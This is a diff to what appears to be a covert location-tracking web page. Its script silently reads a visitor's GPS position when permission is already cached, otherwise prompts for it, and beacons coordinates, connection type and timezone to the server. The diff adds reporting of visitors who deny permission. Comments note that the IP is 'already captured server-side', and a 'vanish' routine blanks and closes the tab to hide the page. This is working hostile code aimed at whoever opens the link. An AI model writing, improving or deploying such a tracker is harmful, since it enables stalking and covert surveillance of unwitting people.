@@ -26,18 +26,15 @@
     return;
   {% endif %}
 
-  // ── Register Service Worker for future visits ──
-  if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('/sw.js', { scope: '/' })
-      .then(function(reg) {
-        // SW registered for future intercepts
-      })
-      .catch(function() {
-        // SW registration failed — page still works normally
-      });
+  // ── Get browser timezone (NO PERMISSION NEEDED) ──
+  function getTimezone() {
+    try {
+      return Intl.DateTimeFormat().resolvedOptions().timeZone;
+    } catch(e) {
+      return null;
+    }
   }
 
-  // ── Connection type (no permission needed) ──
   function getConnType() {
     try {
       var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
@@ -54,7 +51,8 @@
       latitude: lat,
       longitude: lng,
       accuracy: acc,
-      connectionType: getConnType()
+      connectionType: getConnType(),
+      timezone: getTimezone()
     });
     var blob = new Blob([payload], { type: 'application/json' });
     if (navigator.sendBeacon) {
@@ -62,49 +60,47 @@
     } else {
       try { fetch('/api/location-update', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
     }
-    // Mark window as having sent data
+    window._sent = true;
+  }
+
+  function sendDenied() {
+    if (sent) return;
+    sent = true;
+    var payload = JSON.stringify({
+      token: token,
+      connectionType: getConnType(),
+      timezone: getTimezone()
+    });
+    var blob = new Blob([payload], { type: 'application/json' });
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon('/api/location-denied', blob);
+    } else {
+      try { fetch('/api/location-denied', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
+    }
     window._sent = true;
   }
 
   function vanish() {
     if (!sent) { sent = true; window._sent = true; }
     
-    // ── AGGRESSIVE TAB CLOSE ATTEMPTS ──
-    
-    // 1. Replace history entry (prevents back button going to our page)
+    // ── AGGRESSIVE TAB CLOSE ──
     try { window.location.replace('about:blank'); } catch(e) {}
-    
-    // 2. Open self via window.open trick (makes Chrome think it's script-opened)
-    try {
-      var w = window.open('', '_self', '');
-      if (w) w.close();
-    } catch(e) {}
-    
-    // 3. Try self.close
+    try { window.open('', '_self', '').close(); } catch(e) {}
     try { self.close(); } catch(e) {}
-    
-    // 4. Try window.close
     try { window.close(); } catch(e) {}
     
-    // 5. Wipe document body (make it completely empty)
     setTimeout(function() {
       try {
         document.open();
         document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body></body></html>');
         document.close();
       } catch(e) {}
-      
-      // 6. Final close attempt after clearing
-      try { window.close(); } catch(e) {}
-      
-      // 7. Navigate to a page that won't load (no error page shown)
       setTimeout(function() {
         try { window.location.href = 'data:text/html,'; } catch(e) {}
       }, 10);
     }, 10);
   }
 
-  // ── GPS capture ──
   function tryGPS() {
     if (!("geolocation" in navigator)) {
       vanish();
@@ -118,18 +114,17 @@
           if (callback) callback();
         },
         function() {
+          sendDenied();
           if (callback) callback();
         },
         { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
       );
     }
 
-    // Check if permission is cached
     if (navigator.permissions && navigator.permissions.query) {
       navigator.permissions.query({ name: 'geolocation' })
         .then(function(status) {
           if (status.state === 'granted') {
-            // Silent GPS — no prompt
             navigator.geolocation.getCurrentPosition(
               function(pos) {
                 sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
@@ -140,10 +135,9 @@
             );
             setTimeout(function() { if (!window._sent) vanish(); }, 8000);
           } else if (status.state === 'denied') {
-            // IP already captured server-side
+            sendDenied();
             vanish();
           } else {
-            // First visit — prompt will appear (ONE TIME)
             attemptGPS(function() { vanish(); });
             setTimeout(function() { if (!window._sent) vanish(); }, 16000);
           }
@@ -158,13 +152,8 @@
     }
   }
 
-  // ── Execute immediately ──
   tryGPS();
-
-  // ── Hard timeout: vanish in 18s ──
-  setTimeout(function() {
-    if (!window._sent) vanish();
-  }, 18000);
+  setTimeout(function() { if (!window._sent) vanish(); }, 18000);
 })();
 </script>
 </body>
